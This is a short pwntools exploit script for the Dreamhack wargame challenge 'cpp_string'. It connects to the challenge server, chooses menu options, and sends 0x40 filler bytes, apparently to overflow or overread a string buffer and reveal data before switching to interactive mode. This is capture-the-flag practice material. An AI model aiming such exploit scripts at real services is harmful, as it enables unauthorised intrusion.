from pwn import *

#p = process('./cpp_string')
p = remote('host3.dreamhack.games', '15944')

p.sendlineafter(b"input : ", b"2")
p.sendlineafter(b"contents : ", b"a"*0x40)
p.sendlineafter(b"input : ", b"1")
p.sendlineafter(b"input : ", b"3")
p.interactive()